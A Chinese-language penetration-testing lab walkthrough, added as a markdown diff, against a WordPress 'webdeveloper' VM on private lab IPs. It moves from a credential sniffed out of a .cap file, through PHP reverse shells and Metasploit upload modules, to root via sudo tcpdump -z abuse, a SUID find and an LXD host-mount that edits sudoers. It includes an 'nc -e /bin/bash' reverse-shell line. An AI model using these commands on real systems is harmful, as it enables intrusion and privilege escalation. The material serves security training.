@@ -1,0 +1,267 @@
+#  mynew
+.cap文件用wireshark打开即可！ 分析文件
+
+sudo -l 和suid 联合提权
+sudo -l 和cron 联合提权
+lxd提权
+# 
+
+VMware双击打开nat模式即可！
+
+1、nmap 192.168.253.0/24 -sP
+Nmap scan report for 192.168.253.175
+Host is up (0.00031s latency).
+
+
+2、nmap 192.168.253.175 -p- -A
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 4.9.8
+
+
+3、web信息收集
+
+访问：
+http://192.168.253.175/
+发下拿着是wordpress博客站！
+
+dirb爆破出：http://192.168.253.175/ipdata/
+
+访问发现：analyze.cap   下载！
+
+这是.cap文件，这在项目四和项目七介绍过，用wireshark打开即可！
+
+
+温故知新：
+----------------
+项目四：
+wireshark对流量界面右键->追踪流量->TCP流量！
+获得tcp.stream eq 1和tcp.stream eq 2等信息：
+tcp.stream eq 1：第一个流显示了一个文件secret_stuff.txt
+tcp.stream eq 2：sup3rs3cr3tdirlol
+----------------
+wireshark derp.pcap 分析！
+
+1)tcp.stream eq 48    ---tcp追踪  如果追踪UDP就改即可
+或者：
+2）frame contains mrderp  /login  ---查看流量中登录信息
+3）http.request.method == "POST"  ---过滤查看POST请求信息打开双击查看
+
+log=mrderp&pwd=derpderpderpderpderpderpderp
+
+----------------
+
+wireshark analyze.cap   ---打开
+在Hypertext Transfer Protocol中可以看到登录信息！
+或者右键->追踪流->tcp流也可以！
+
+http://192.168.253.175/wp-admin/
+webdeveloper
+Te5eQg&4sBS!Yr$)wf%(DcAd
+
+密码真复杂，成功登录！
+
+
+4、文件上传
+--------------------------------
+1）方法1：
+这里复制php-reverse-shell.php到本地目录：
+cp /usr/share/webshells/php/php-reverse-shell.php .
+
+在项目二十三中：
+点击：Appearance->Add New->Upload Theme->文件上传
+
+dirb爆破前面是枚举出：
+http://192.168.253.175/wp-content/uploads
+在这目录下运行开启nc监听即可！
+
+--------------------------------
+2）方法2：
+点击：Appearance->Editor修改php内容：
+切换twenty sixteen后，发现可以写入！
+
+将php-reverse-shell.php内容写入即可！
+
+nc -vlp 1234
+访问：
+http://192.168.253.175/wp-content/themes/twentysixteen/404.php
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+成功获得反弹shell！
+--------------------------------
+3）方法3---插件处上传
+
+点击Plugins->Editor修改php内容！
+Hello Dolly->Activate 反弹shell成功
+--------------------------------
+3）方法3 ---MSF 文件上传反弹shell
+
+在框架添加插件：ReFlex Gallery
+安装完成点击：Activate  ---启动
+
+项目七中回顾：类似方法
+use exploit/unix/webapp/wp_reflexgallery_file_upload
+set rhosts 192.168.253.175
+exploit
+
+
+msf利用：
+msfconsole
+search Slideshow Gallery
+use exploit/unix/webapp/wp_slideshowgallery_upload
+set rhosts 192.168.4.58
+set targeturi /weblog
+set wp_user admin
+set wp_password admin
+run
+
+
+5、内部信息收集
+
+1）LXD权限    108(lxd)   ---用户是lxd组成员
+root      2412  0.0  1.9 446464 19404 ?        Ssl  11:15   0:00 /usr/lib/lxd/lxd
+/var/log/lxd/lxd.log
+
+
+2）信息泄露
+/var/www/html/wp-config.php
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'webdeveloper');
+define('DB_PASSWORD', 'MasterOfTheUniverse');
+define('DB_HOST', 'localhost');
+
+
+6、提权
+
+ssh webdeveloper@192.168.253.175
+MasterOfTheUniverse
+
+---------------------------------------
+方法1：sudo all 提权
+
+sudo -l
+
+User webdeveloper may run the following commands on webdeveloper:
+    (root) /usr/sbin/tcpdump
+
+项目二十五用过该提权：
+https://gtfobins.github.io/gtfobins/tcpdump/
+
+echo "nc -e /bin/bash 192.168.253.166 9988" > dayu
+chmod +x dayu
+sudo tcpdump -ln -i eth1 -w /dev/null -W 1 -G 1 -z /tmp/dayu -Z root
+发现无法获得反弹shell，因为该环境的nc -e不允许，版本太低了nc！
+
+
+查看是否存在find命令setuid执行权限：
+find / -perm -4000 2>/dev/null | grep find
+
+echo "chmod u+s /usr/bin/find"> shell.sh
+chmod +x shell.sh
+sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
+
+创建完成确认find命令是否成功被赋予setuid权限：
+find / -perm -4000 2>/dev/null | grep find
+执行find命令开始提权
+find /tmp -exec sh -i  \;   ---发现没有获得root权限
+find . -exec /bin/sh -p \;  --- -q执行即可
+
+-i eth0 从指定网卡捕获数据包
+-w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果）
+-W [num] 指定抓包数量
+-G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储
+-z [command] 运行指定的命令
+-Z [user] 指定用户执行命令
+
+---------------------------------------
+方法2：滥用该lxd组来重新挂载文件系统并更改root拥有的文件
+参考：
+https://reboare.github.io/lxd/lxd-escape.html
+
+项目19~20详细介绍过：
+
+lxd init   ----一直回车
+
+创建了一个lxc容器：
+lxc init ubuntu:16.04 test -c security.privileged=true
+
+分配了安全权限，并将整个磁盘挂载到/mnt/root：
+lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
+这时候会下载几分钟！
+lxc start test
+lxc exec test bash
+这时候挂载的test 乌班图容器就挂载好了，执行命令：
+
+echo "%webdeveloper ALL=(ALL:ALL) ALL" >> /mnt/root/etc/sudoers
+
+exit 
+sudo su
+
+---------------------------------------
+
+
+
+拓展小知识：
+
+echo 'echo "%webdeveloper ALL=(ALL:ALL) ALL" >> /etc/sudoers' > test.sh
+chmod +x test.sh
+sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/test.sh -Z root
+sudo -l   ---这时候就拥有所有权了
+
+sudo su   ---获得root权限！
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
